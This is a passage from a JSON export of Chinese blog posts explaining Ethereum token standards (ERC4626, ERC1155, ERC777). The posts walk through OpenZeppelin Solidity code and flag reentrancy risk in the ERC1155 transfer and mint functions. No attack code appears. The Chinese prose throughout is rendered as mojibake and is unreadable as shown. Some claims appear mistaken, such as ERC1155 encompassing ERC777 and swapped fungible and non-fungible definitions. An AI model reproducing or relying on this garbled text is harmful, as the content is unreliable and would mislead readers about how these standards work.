shares, maxShares); &#125; uint256 assets = previewRedeem(shares); _withdraw(_msgSender(), receiver, owner, assets, shares); return assets;&#125; è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå–æ¬¾å‡½æ•°ï¼Œå†…éƒ¨è°ƒç”¨çš„ä¹Ÿæ˜¯_withdraw()å‡½æ•°ï¼Œä½†æ˜¯å’Œwithdraw()å‡½æ•°ä¸åŒçš„ç‚¹åœ¨äºï¼Œå‚æ•°ä¼ å…¥çš„æ˜¯sharesã€‚ 3. æ€»ç»“ ERC4626 åè®®æ˜¯ä¸€ç§ç”¨äºä»£å¸åŒ–ä¿é™©åº“çš„æ ‡å‡†ï¼Œå®ƒå¯ä»¥ä¼˜åŒ–å’Œç»Ÿä¸€æ”¶ç›Šä¿é™©åº“çš„æŠ€æœ¯å‚æ•°ã€‚å®ƒä¸ºå•ä¸ªåº•å±‚ ERC-20 ä»£å¸çš„æ”¶ç›Šä¿é™©åº“æä¾›äº†ä¸€ä¸ªæ ‡å‡†çš„ APIï¼Œå¹¶ä¸ºå­˜å…¥ã€å–å‡ºã€é“¸é€ ã€èµå›ç­‰æ“ä½œæä¾›äº†åŸºæœ¬åŠŸèƒ½ã€‚å®ƒåœ¨ DeFi é¢†åŸŸæœ‰å¾ˆå¤šæ½œåœ¨çš„åº”ç”¨åœºæ™¯ï¼Œå¯ä»¥ä¸ºç”¨æˆ·æä¾›æ›´å¤šçš„é€‰æ‹©å’Œä¾¿åˆ©ã€‚å®ƒä¹Ÿæœ‰åŠ©äºæ¨åŠ¨æ”¶ç›Šä¿é™©åº“çš„å‘å±•å’Œåˆ›æ–°ï¼Œä¸º DeFi ç”Ÿæ€ç³»ç»Ÿå¢åŠ æ›´å¤šçš„ä»·å€¼ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"}]},{"title":"ERC1155","slug":"DEFI/ERC/ERC1155","date":"2024-01-15T04:00:00.000Z","updated":"2024-01-15T04:00:00.000Z","comments":true,"path":"2024/01/15/DEFI/ERC/ERC1155/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/15/DEFI/ERC/ERC1155/","excerpt":"","text":"1. ERC1155 ç®€ä»‹ è¿™æ˜¯ä¸€ä¸ªç®¡ç†å¤šç§ä»£å¸ç±»å‹çš„åˆçº¦æ ‡å‡†ï¼Œè¯¥åˆçº¦å¯ä»¥åŒ…æ‹¬åŒè´¨åŒ–ä»£å¸å’ŒéåŒè´¨åŒ–ä»£å¸ï¼Œå¯ä»¥ä»£è¡¨ä»»æ„æ•°é‡çš„åŒè´¨åŒ–å’ŒéåŒè´¨åŒ–çš„ä»£å¸ç±»å‹ï¼ŒæŠ½è±¡ä¸Šå¯ä»¥è§£é‡Šä¸ºï¼šERC1155 å›Šæ‹¬äº† ERC20å’ŒERC777è¿™ä¸¤ç§æ ‡å‡†ã€‚ERC1155çš„ç”¨å¤„ï¼Œä¸¾ä¸ªæ¸¸æˆçš„ä¾‹å­ï¼ˆç‹è€…è£è€€ï¼‰ä¾‹å­ï¼šè¦æ˜¯ä½¿ç”¨ERC20æ¥è¡¨ç¤ºæ¸¸æˆçš„é‡‘å¸ã€é’»çŸ³ã€ç‚¹åˆ¸ï¼Œå¾ˆæ˜æ˜¾ERC20æ— æ³•åšåˆ°ï¼Œå› ä¸ºERC20 tokenæ˜¯åŒè´¨åŒ–çš„ï¼Œä¸èƒ½æ˜ç¡®åŒºåˆ†tokenä¸tokenä¹‹é—´çš„ä¸åŒï¼›è¦æ˜¯ä½¿ç”¨ERC721ï¼Œæ ¹æ®ERC721éåŒè´¨åŒ–çš„ç‰¹ç‚¹ï¼Œç¡®å®æ˜¯å¯ä»¥è¡¨ç¤ºé‡‘å¸ã€é’»çŸ³ã€ç‚¹åˆ¸ï¼Œä½†æ˜¯ERC721 tokenä¸èƒ½ç»†åˆ†ï¼Œä»è€Œå¯¼è‡´åªèƒ½è¡¨ç¤ºâ€œ1â€ä¸ªé‡‘å¸ã€é’»çŸ³ã€ç‚¹åˆ¸ï¼Œè¿™å¾ˆæ˜¾ç„¶æ˜¯ä¸å¯å–çš„ã€‚æ­£æ˜¯ä¸ºäº†è§£å†³è¿™äº›ä¸è¶³ï¼Œä»è€Œå‘è¡Œäº†ERC1155æ ‡å‡†ï¼Œè¿™å¯ä»¥å¾ˆå®Œç¾çš„è§£å†³ä¸Šè¿°é—®é¢˜ã€‚åœ¨ERC1155 tokenä¸­ä¸åŒçš„idè¡¨ç¤ºä¸åŒçš„å±æ€§ï¼Œè€Œä¸”è¿˜å¯ä»¥ç»™idè®¾ç½®æ•°é‡ï¼Œæœ‰äº†è¿™äº›ç‰¹æ€§ï¼Œä¾¿å¯ä»¥å¾ˆå¥½çš„è§£å†³ä¸Šè¿°ç—›ç‚¹ã€‚ åŒè´¨åŒ–ä»£å¸çš„è¡¨ç¤ºæ–¹å¼ä¸ºï¼šå¦‚æœæŸä¸ªidå¯¹åº”çš„ä»£å¸æ€»é‡ä¸º1ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯éåŒè´¨åŒ–ä»£å¸ï¼Œç±»ä¼¼ERC721ï¼› éåŒè´¨åŒ–ä»£å¸çš„è¡¨ç¤ºæ–¹å¼ä¸ºï¼šå¦‚æœæŸä¸ªidå¯¹åº”çš„ä»£å¸æ€»é‡å¤§äº1ï¼Œé‚£ä¹ˆä»–å°±æ˜¯åŒè´¨åŒ–ä»£å¸ï¼Œå› ä¸ºè¿™äº›ä»£å¸éƒ½åˆ†äº«åŒä¸€ä¸ªidï¼Œç±»ä¼¼ERC20ã€‚ 2. ERC1155ä»£ç è§£è¯»ä»£ç æ¥è‡ª openzepelinï¼šé“¾æ¥ã€‚ åè®®çš„å®˜æ–¹æ–‡æ¡£ï¼šé“¾æ¥ã€‚ 2.1 CoreIERC1155.sol 123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &#123;IERC165&#125; from &quot;../../utils/introspection/IERC165.sol&quot;;/** * @dev Required interface of an ERC-1155 compliant contract, as defined in the * https://eips.ethereum.org/EIPS/eip-1155[ERC]. */interface IERC1155 is IERC165 &#123; event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value); event TransferBatch( address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values ); event ApprovalForAll(address indexed account, address indexed operator, bool approved); event URI(string value, uint256 indexed id); function balanceOf(address account, uint256 id) external view returns (uint256); function balanceOfBatch( address[] calldata accounts, uint256[] calldata ids ) external view returns (uint256[] memory); function setApprovalForAll(address operator, bool approved) external; function isApprovedForAll(address account, address operator) external view returns (bool); function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes calldata data) external; function safeBatchTransferFrom( address from, address to, uint256[] calldata ids, uint256[] calldata values, bytes calldata data ) external;&#125; è¿™æ˜¯IERC1155æ¥å£ï¼Œæ¥å£ä¸­å®šä¹‰äº†å…­ä¸ªå‡½æ•° balanceOf()ï¼šå•å¸ç§ä½™é¢æŸ¥è¯¢ï¼Œè¿”å›accountæ‹¥æœ‰çš„idç§ç±»çš„ä»£å¸çš„æŒä»“é‡ã€‚ balanceOfBatch()ï¼šå¤šå¸ç§ä½™é¢æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„åœ°å€accountsæ•°ç»„å’Œä»£å¸ç§ç±»idsæ•°ç»„çš„é•¿åº¦è¦ç›¸ç­‰ã€‚ setApprovalForAll()ï¼šæ‰¹é‡æˆæƒï¼Œå°†è°ƒç”¨è€…çš„ä»£å¸æˆæƒç»™operatoråœ°å€ã€‚ã€‚ isApprovedForAll()ï¼šæŸ¥è¯¢æ‰¹é‡æˆæƒä¿¡æ¯ï¼Œå¦‚æœæˆæƒåœ°å€operatorè¢«accountæˆæƒï¼Œåˆ™è¿”å›trueã€‚ safeTransferFrom()ï¼šå®‰å…¨å•å¸è½¬è´¦ï¼Œå°†amountå•ä½idç§ç±»çš„ä»£å¸ä»fromåœ°å€è½¬è´¦ç»™toåœ°å€ã€‚å¦‚æœtoåœ°å€æ˜¯åˆçº¦ï¼Œåˆ™ä¼šéªŒè¯æ˜¯å¦å®ç°äº†onERC1155Received()æ¥æ”¶å‡½æ•°ã€‚ safeBatchTransferFrom()ï¼šå®‰å…¨å¤šå¸è½¬è´¦ï¼Œä¸å•å¸è½¬è´¦ç±»ä¼¼ï¼Œåªä¸è¿‡è½¬è´¦æ•°é‡amountså’Œä»£å¸ç§ç±»idså˜ä¸ºæ•°ç»„ï¼Œä¸”é•¿åº¦ç›¸ç­‰ã€‚å¦‚æœtoåœ°å€æ˜¯åˆçº¦ï¼Œåˆ™ä¼šéªŒè¯æ˜¯å¦å®ç°äº†onERC1155BatchReceived()æ¥æ”¶å‡½æ•°ã€‚ IERC1155MetadataURI.sol 123interface IERC1155MetadataURI is IERC1155 &#123; function uri(uint256 id) external view returns (string memory);&#125; è¿™æ˜¯ä¸€ä¸ªå¯é€‰æ¥å£ï¼Œç”¨äºæŸ¥è¯¢æŒ‡å®š token IDçš„ uriã€‚å¦‚æœç»§æ‰¿äº†è¯¥æ¥å£ï¼Œåˆ™éœ€è¦åœ¨ ERC165çš„supportsInterface()å‡½æ•°ä¸­è¿”å›å¸¸é‡ï¼ˆç”¨æ¥æ£€éªŒæ˜¯å¦å®ç°è¯¥æ¥å£ï¼‰ã€‚æ³¨æ„ï¼šè¯¥ uri()å‡½æ•°ä¸å¾—ç”¨äºæ£€æŸ¥ä»¤ç‰Œæ˜¯å¦å­˜åœ¨ï¼Œå› ä¸ºå³ä½¿ä»¤ç‰Œä¸å­˜åœ¨ï¼Œå®ç°ä¹Ÿå¯èƒ½è¿”å›æœ‰æ•ˆçš„å­—ç¬¦ä¸²ã€‚ IERC1155Receiver.sol å¦‚æœERC1155TOKENçš„æ¥æ”¶è€…receiveræ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œé‚£ä¹ˆæ¥æ”¶è€…å¿…é¡»è¦å®ç°è¯¥æ¥å£ã€‚ è¯¥æ¥å£æœ‰ä¸¤ä¸ªå‡½æ•°ï¼šï¼ˆå‰ææ˜¯æ¥æ”¶è€…æ˜¯åˆçº¦åœ°å€ï¼‰ onERC1155Receivedï¼šè¿™ä¸ªå‡½æ•°æ˜¯åœ¨è°ƒç”¨ ERC1155çš„ safeTransferFrom()å’Œ _mint()æ—¶ï¼Œæ¥æ”¶è€…çš„è¯¥å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå¹¶æŒ‰è¦æ±‚è¿”å›æŒ‡å®šçš„å€¼ bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;))ã€‚ onERC1155BatchReceivedï¼šè¿™ä¸ªå‡½æ•°æ—¶åœ¨è°ƒç”¨ ERC1155çš„ safeBatchTransferFrom()æ—¶ï¼Œæ¥æ”¶è€…çš„è¯¥å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå¹¶æŒ‰è¦æ±‚è¿”å›æŒ‡å®šçš„å€¼ bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))ã€‚ ERC1155.sol 123mapping(uint256 id =&gt; mapping(address account =&gt; uint256)) private _balances;mapping(address account =&gt; mapping(address operator =&gt; bool)) private _operatorApprovals; _balancesï¼šç”¨æ¥ä¿å­˜ ä»£å¸ç§ç±»idå¯¹åº” è´¦æˆ· accountçš„ä½™é¢ï¼Œå³ä¿å­˜ accountæ‹¥æœ‰å¤šå°‘ç§ç±»ä¸ºidçš„tokenä¸ªæ•°ã€‚ _operatorApprovalsï¼šç”¨æ¥ä¿å­˜ accountå¯¹operatorçš„æˆæƒæƒ…å†µï¼Œtrueè¡¨ç¤ºå·²ç»æˆæƒï¼Œfalseè¡¨ç¤ºæœªæˆæƒã€‚ 12345function unsafeMemoryAccess(uint256[] memory arr, uint256 pos) internal pure returns (uint256 res) &#123; assembly &#123; res := mload(add(add(arr, 0x20), mul(pos, 0x20))) &#125;&#125; è¿™æ˜¯åº“åˆçº¦ä¸­çš„å‡½æ•°ï¼ŒåŠŸèƒ½æ—¶è¯»å– arræ•°ç»„æŒ‡å®šç´¢å¼•çš„å€¼ã€‚ è§£é‡Šæ±‡ç¼– 12345mload(add(add(arr, 0x20), mul(pos, 0x20)))add(arr,0x20) //è·³è¿‡æ•°ç»„é•¿åº¦ï¼Œå®šä½åˆ°æ•°æ®æ®µmul(pos, 0x20) // EVMçš„å­˜å‚¨æœºåˆ¶æ˜¯ä»¥32bytesä¸ºä¸€ä¸ªå•ä½ï¼Œè¿™æ®µæ“ä½œç çš„ç»“æœæ˜¯è®¡ç®—é•¿åº¦ï¼Œæ¯”å¦‚ pos=2,åˆ™è¡¨ç¤º 2 * 32 bytesadd(add(arr, 0x20), mul(pos, 0x20)) // è®¡ç®— 32bytes + pos * 32bytesmload(add(add(arr, 0x20), mul(pos, 0x20))) // è®¾ x = add(add(arr, 0x20), mul(pos, 0x20)),åˆ™è¡¨ç¤ºè¯»å–[x, x+32bytes)çš„æ•°æ® å…¶å®å°±æ˜¯ç”¨æ±‡ç¼–çš„è¯­è¨€å®ç°ï¼Œè¯»å–æ•°ç»„æŒ‡å®šç´¢å¼•çš„å€¼ã€‚ 1234function _asSingletonArrays( uint256 element1, uint256 element2) private pure returns (uint256[] memory array1, uint256[] memory array2) è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½åˆ™æ˜¯å°†ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«å°è£…æˆä¸¤ä¸ª uint256[]ç±»å‹çš„æ•°ç»„ã€‚æ±‡ç¼–å®ç°çš„é€»è¾‘éƒ½æœ‰æ³¨é‡Šï¼Œå†™å¾—å¾ˆæ¸…æ¥šã€‚ 123456789101112131415161718192021222324252627282930313233343536function _update(address from, address to, uint256[] memory ids, uint256[] memory values) internal virtual &#123; if (ids.length != values.length) &#123; revert ERC1155InvalidArrayLength(ids.length, values.length); &#125; address operator = _msgSender(); for (uint256 i = 0; i &lt; ids.length; ++i) &#123; uint256 id = ids.unsafeMemoryAccess(i); uint256 value = values.unsafeMemoryAccess(i); if (from != address(0)) &#123; uint256 fromBalance = _balances[id][from]; if (fromBalance &lt; value) &#123; revert ERC1155InsufficientBalance(from, fromBalance, value, id); &#125; unchecked &#123; // Overflow not possible: value &lt;= fromBalance _balances[id][from] = fromBalance - value; &#125; &#125; if (to != address(0)) &#123; _balances[id][to] += value; &#125; &#125; if (ids.length == 1) &#123; uint256 id = ids.unsafeMemoryAccess(0); uint256 value = values.unsafeMemoryAccess(0); emit TransferSingle(operator, from, to, id, value); &#125; else &#123; emit TransferBatch(operator, from, to, ids, values); &#125; &#125; è¿™æ˜¯èµ„äº§æ›´æ–°çš„æ ¸å¿ƒå‡½æ•°ï¼Œå‚ä¸å®Œæˆé“¸å¸ï¼Œè½¬è´¦ï¼Œé”€å¸æ“ä½œã€‚è¦æ±‚å‚æ•°çš„ä¸¤ä¸ªæ•°ç»„é•¿åº¦ç›¸ç­‰ã€‚ é“¸å¸ï¼šå‚æ•°fromçš„å€¼ä¸º address(0)ï¼Œé€šè¿‡forå¾ªç¯ä¸º _balances[id][to] += valueæ·»åŠ ä½™é¢ï¼Œè¾¾æˆé“¸å¸ã€‚è¿™å¯¹å•æ¬¡é“¸å¸å’Œæ‰¹é‡é“¸å¸éƒ½é€‚ç”¨ã€‚ è½¬è´¦ï¼šå‚æ•°fromå’Œtoéƒ½ä¸ä¸ºaddress(0)ï¼Œé€šè¿‡forå¾ªç¯å®Œæˆå¯¹ fromå’Œtoçš„ä½™é¢ä¿®æ”¹ï¼Œè¿™å¯¹å•æ¬¡è½¬è´¦å’Œæ‰¹é‡è½¬è´¦éƒ½é€‚ç”¨ã€‚ é”€å¸ï¼šå‚æ•°toä¸ºaddress(0)ï¼Œé€šè¿‡forå¾ªç¯ä¿®æ”¹_balances[id][from] = fromBalance - value;ï¼Œè¦æ±‚fromBalance &gt;=valueï¼Œè¿™å¯¹å•æ¬¡é”€å¸å’Œæ‰¹é‡é”€å¸éƒ½é€‚ç”¨ã€‚ 12345678910111213141516171819function _updateWithAcceptanceCheck( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data) internal virtual &#123; _update(from, to, ids, values); if (to != address(0)) &#123; address operator = _msgSender(); if (ids.length == 1) &#123; uint256 id = ids.unsafeMemoryAccess(0); uint256 value = values.unsafeMemoryAccess(0); ERC1155Utils.checkOnERC1155Received(operator, from, to, id, value, data); &#125; else &#123; ERC1155Utils.checkOnERC1155BatchReceived(operator, from, to, ids, values, data); &#125; &#125;&#125; è¿™ä¸ªå‡½æ•°è´Ÿè´£æ›´æ–°ç”¨æˆ·èµ„äº§ä»¥åŠæ£€éªŒåˆçº¦æ¥å—è€…æ˜¯å¦å®ç°äº† checkOnERC1155Receivedæ¥å£ï¼Œè¿™é‡Œé‡‡ç”¨äº† checks-effect-interactionçš„æ–¹å¼ï¼Œå°†åˆçº¦çš„äº¤äº’æ”¾åœ¨äº†_updateå‡½æ•°åé¢ï¼Œä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†å¯¹èµ„é‡‘çš„é‡å…¥é£é™©ï¼Œä½†æ˜¯è¿™é‡Œä¾æ—§å­˜åœ¨é‡å…¥çš„é£é™©ã€‚ 1function _safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) internal å®ç°å•ç¬”è½¬è´¦ï¼Œfromå’Œtoéƒ½ä¸èƒ½ä¸ºaddress(0)ï¼Œå…ˆé€šè¿‡_asSingletonArrays(id, value)å°†idå’ŒvalueåŒ…è£…æˆä¸¤ä¸ªæ•°ç»„ï¼Œå†è°ƒç”¨_updateWithAcceptanceCheck(from, to, ids, values, data)ï¼Œè¿›è¡Œèµ„äº§çš„æ›´æ–°å’Œå¯¹åˆçº¦æ¥æ”¶è€…çš„æ¥å£æ£€éªŒã€‚ 1function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) public virtual å®ç°å®‰å…¨å•ç¬”è½¬è´¦ï¼Œè¦æ±‚msg.senderæ˜¯ fromæˆ–è€…fromå¯¹msg.senderæ‰§è¡Œäº†æˆæƒæ“ä½œï¼Œå¦åˆ™revert()ã€‚è½¬è´¦é€»è¾‘è°ƒç”¨_safeTransferFrom(from, to, id, value, data)ã€‚ 1234567function _safeBatchTransferFrom( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data ) internal å®ç°æ‰¹é‡è½¬è´¦ï¼Œfromå’Œtoéƒ½ä¸èƒ½ä¸ºaddress(0)ï¼Œè°ƒç”¨_updateWithAcceptanceCheck(from, to, ids, values, data);è¿›è¡Œèµ„äº§çš„æ›´æ–°å’Œå¯¹åˆçº¦æ¥æ”¶è€…çš„æ¥å£æ£€éªŒã€‚ 1234567function safeBatchTransferFrom( address from, address to, uint256[] memory ids, uint256[] memory values, bytes memory data ) public virtual å®ç°å®‰å…¨æ‰¹é‡è½¬è´¦ï¼Œå°†fromæ‰€æ‹¥æœ‰çš„ idsï¼Œå‘toè½¬ç§»valuesï¼Œidså’Œvaluesçš„ç´¢å¼•æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚è¦æ±‚msg.senderæ˜¯ fromæˆ–è€…fromå¯¹msg.senderæ‰§è¡Œäº†æˆæƒæ“ä½œï¼Œå¦åˆ™revert()ã€‚è½¬è´¦é€»è¾‘è°ƒç”¨_safeBatchTransferFrom(from, to, ids, values, data);ã€‚ 1234567function _setApprovalForAll(address owner, address operator, bool approved) internal virtual &#123; if (operator == address(0)) &#123; revert ERC1155InvalidOperator(address(0)); &#125; _operatorApprovals[owner][operator] = approved; emit ApprovalForAll(owner, operator, approved);&#125; æˆæƒæ“ä½œï¼Œownerå¯¹operatoræ‰§è¡Œæˆæƒæ“ä½œï¼Œoperatorè¢«æˆæƒä¹‹åå¯ä»¥æ“ä½œownerçš„èµ„äº§ã€‚åŒæ—¶ä¹Ÿå¯ä»¥å–æ¶ˆæˆæƒï¼Œå³ä¼ å…¥çš„å‚æ•°approveä¸º falseã€‚ 1234567function _mint(address to, uint256 id, uint256 value, bytes memory data) internal &#123; if (to == address(0)) &#123; revert ERC1155InvalidReceiver(address(0)); &#125; (uint256[] memory ids, uint256[] memory values) = _asSingletonArrays(id, value); _updateWithAcceptanceCheck(address(0), to, ids, values, data);&#125; å®ç°é“¸é€ IDä¸ºidçš„ä»£å¸ï¼Œä¸”å‘è¡Œé‡ä¸ºvalueã€‚è¿™é‡Œè°ƒç”¨äº†_updateWithAcceptanceCheck()å‡½æ•°å­˜åœ¨é‡å…¥é£é™©ã€‚ 123456function _mintBatch(address to, uint256[] memory ids, uint256[] memory values, bytes memory data) internal &#123; if (to == address(0)) &#123; revert ERC1155InvalidReceiver(address(0)); &#125; _updateWithAcceptanceCheck(address(0), to, ids, values, data);&#125; å®ç°é“¸é€ IDä¸ºidsçš„ä»£å¸ï¼Œä¸”å‘è¡Œé‡ä¸ºvaluesï¼Œä»£å¸IDå·å’Œå‘è¡Œé‡ä¸€ä¸€å¯¹åº”ã€‚è¿™é‡Œè°ƒç”¨äº†_updateWithAcceptanceCheck()å‡½æ•°å­˜åœ¨é‡å…¥é£é™©ã€‚ 2.2 ExtensionsERC1155Pausable.sol 12345678function _update( address from, address to, uint256[] memory ids, uint256[] memory values ) internal virtual override whenNotPaused &#123; super._update(from, to, ids, values); &#125; å®ç°äº†åˆçº¦æš‚åœåŠŸèƒ½ï¼Œé‡å†™äº†ERC1155çš„_updateå‡½æ•°ï¼Œä½¿å¾—å‡¡æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„æ“ä½œéƒ½ä¼šå—åˆ°æ§åˆ¶ã€‚ ERC1155Burnable.sol æä¾›äº†ä»£å¸æ³¨é”€åŠŸèƒ½ï¼Œå³é—´æ¥çš„å°†ä¸¤ä¸ªå†…éƒ¨çš„é”€å¸å‡½æ•°è®¾ç½®ä¸ºexternalå‡½æ•°ã€‚å½“ç„¶äº†ï¼Œæ‰§è¡Œé”€å¸çš„å‰ææ˜¯msg.senderæ˜¯tokençš„owneræˆ–è€…æ˜¯ operatorã€‚ ERC1155Supply.sol ä¸»è¦æä¾›äº†ä¸€ä¸ªç»Ÿè®¡å‘è¡Œé‡çš„åŠŸèƒ½ï¼Œé“¸å¸ä¼šä½¿å¾—_totalSupply[id]å‘è¡Œé‡å¢å¤§ï¼›é”€å¸ä¼šä½¿å¾—_totalSupply[id]å‘è¡Œé‡å‡å°ã€‚åŒæ—¶è¿˜å¯ä»¥é€šè¿‡exists(uint256 id)æŸ¥è¯¢ token id æ˜¯å¦ä»¥åŠå­˜åœ¨ã€‚ ERC1155URIStorage.sol é€šè¿‡äº†è®¾ç½® token çš„ URIåŠŸèƒ½ï¼ŒåŒæ—¶è¿˜å®ç°äº†ä¸ºæ¯ä¸€ç§ tokenè®¾ç½® tokenURIã€‚ 2.3 UtilitiesERC1155Utils.sol æä¾›äº†ä¸¤ä¸ªç”¨æ¥éªŒè¯æ¥æ”¶è€…æ˜¯å¦å®ç°äº†æŒ‡å®šæ¥å£å’Œå‡½æ•°çš„åŠŸèƒ½ã€‚ 12// function checkOnERC1155Receivedtry IERC1155Receiver(to).onERC1155Received(operator, from, id, value, data) returns (bytes4 response) 1234// function checkOnERC1155BatchReceivedtry IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, values, data) returns ( bytes4 response ) 3. ERC1155å®‰å…¨éšæ‚£ERC1155å­˜åœ¨é‡å…¥é£é™©ï¼Œæœ‰é‡å…¥é£é™©çš„å‡½æ•°åˆ†åˆ«æ˜¯ï¼š _updateWithAcceptanceCheck() _mint() _mintBatch() _safeTransferFrom() safeTransferFrom() _safeBatchTransferFrom() safeBatchTransferFrom()","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"}],"tags":[{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1155","slug":"ERC1155","permalink":"https://biyouqiuqiu.com/tags/ERC1155/"}]},{"title":"ERC777","slug":"DEFI/ERC/ERC777.sol","date":"2024-01-12T04:00:00.000Z","updated":"2024-01-12T04:00:00.000Z","comments":true,"path":"2024/01/12/DEFI/ERC/ERC777.sol/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/12/DEFI/ERC/ERC777.sol/","excerpt":"","text":"1. ERC777ç®€ä»‹ è¿™æ˜¯æ˜¯å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼šé“¾æ¥ã€‚æˆ‘è®°å½•çš„æ˜¯æˆ‘è¯»æ–‡æ¡£å’Œä»£ç çš„è‡ªæˆ‘ç†è§£ã€‚ ERC777ä¸ERC20å…¼å®¹ï¼ˆå…¼å®¹çš„æ„æ€å°±æ˜¯ERC777çš„åŠŸèƒ½åŒ…æ‹¬äº†ERC20çš„æ‰€æœ‰åŠŸèƒ½ï¼Œå®ç°å…¼å®¹çš„æ–¹å¼å°±æ˜¯ï¼Œè®©ERC777ç›´æ¥ç»§æ‰¿IERC20æ¥å£ã€‚ï¼‰ï¼ŒåŒæ—¶å¼•å…¥äº†operatoræ“ä½œå‘˜çš„æ¦‚å¿µï¼Œæ“ä½œå‘˜å¯ä»¥ä»£è¡¨å¦ä¸€ä¸ªåœ°å€ï¼ˆåˆçº¦æˆ–è€…æ™®é€šè´¦æˆ·ï¼‰å‘é€ä»£å¸ï¼Œè¿™ä¸ªæ“ä½œå‘˜çš„èº«ä»½ç±»ä¼¼å§‹äºERC20ä¸­è¢« æŸåœ°å€æ‰§è¡Œ approveæ“ä½œåçš„èº«ä»½ï¼Œå¯ä»¥æ‰˜ç®¡æˆæƒè¿™çš„èµ„äº§ã€‚åŒæ—¶è¿˜å¼•è¿›äº†senderå’Œreceiverçš„é’©å­å‡½æ•°ï¼ˆhooksï¼‰è®©ä»£å¸æŒæœ‰è€…å’Œä»£å¸æ¥æ”¶è€…èƒ½æœ‰æ›´å¤šçš„å¤„ç†ã€‚è€Œä¸”ERC777è¿˜é‡‡ç”¨äº†ERC1820æ ‡å‡†çš„ä¼˜ç‚¹ï¼Œå¯ä»¥åˆ¤æ–­æŸåˆçº¦æ˜¯å¦å®ç°ERC777åè®®çš„ç›¸å…³æ¥å£ï¼Œæ›´é‡è¦çš„æ˜¯è¿˜å¯ä»¥å°†sender&#x2F;receiverçš„é’©å­å‡½æ•°æ”¾åˆ° åœ°å€çš„ implementå»å¤„ç†ï¼Œè¿™æ ·ä¸€æ¥ï¼Œä½¿å¾—æ•´ä¸ªä»£å¸ä½“ç³»æ›´ä¸°å¯Œï¼Œæ‹“å±•æ€§ä¹Ÿå¤§å¤§å¢å¼ºã€‚ 2. ERC777ä»£ç è§£è¯»æºç æ¥è‡ª openzeppelinï¼šé“¾æ¥ã€‚é˜…è¯»è¯¥ä»£ç å¿…é¡»è¦æœ‰ERC1820çš„å‰ç½®çŸ¥è¯†ï¼ŒERC777çš„æºç å¯ä»¥åˆ†ä¸ºcoreå’Œhookséƒ¨åˆ†ã€‚ 2.1 Coreéƒ¨åˆ†è§£è¯» ERC777.sol 1constructor(string memory name,string memory symbol,address[] memory defaultOperators) æ„é€ å‡½æ•°ï¼šåœ¨éƒ¨ç½²ERC777åˆçº¦çš„æ—¶å€™ï¼Œå°±éœ€è¦ä¼ å…¥é»˜è®¤çš„ operatorï¼Œè€Œä¸”é»˜è®¤çš„ operatorä¸èƒ½è¿›è¡Œå¢åŠ å’Œåˆ é™¤æ“ä½œã€‚è€Œä¸”è¿˜ä¼šå°†è‡ªèº«æ·»åŠ åˆ° ERC1820æ³¨å†Œè¡¨ä¸­_erc1820.setInterfaceImplementer(address(this), keccak256(&quot;ERC777Token&quot;), address(this));è¿™è¡Œä»£ç çš„æ„æ€å°±æ˜¯ï¼Œè®°å½•address(this)åœ°å€å®ç°ERC777Tokenæ¥å£çš„åˆçº¦åœ°å€æ˜¯address(this)ï¼Œæ¢å¥è¯å°±æ˜¯ â€œæˆ‘â€è‡ªå·±å®ç°äº† ERC777æ¥å£ï¼Œå¹¶å°†å…¶è®°å½•åœ¨æ³¨å†Œè¡¨ä¸­ã€‚ 2.1.1 View Funciotns**name() symbol() decimals() totalSupply() balanceOf()*è¿™å‡ ä¸ªå‡½æ•°å’ŒERC20çš„ç”¨æ³•ä¸€æ ·ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šgranularity()å‡½æ•°ï¼Œgranularity*å¿…é¡»åœ¨åˆ›å»ºçš„æ—¶è®¾ç½®ï¼Œä¸”ä¸èƒ½ä¿®æ”¹è¿™ä¸ªå€¼ã€‚åŒæ—¶è¿˜è¦ä¿è¯è¿™ä¸ªå€¼å¿…é¡» &gt;=1ï¼Œæ‰§è¡Œ é“¸å¸ï¼Œé”€å¸ï¼Œå‘é€æ“ä½œçš„èµ„äº§æ•°é‡å¿…é¡»æ˜¯ 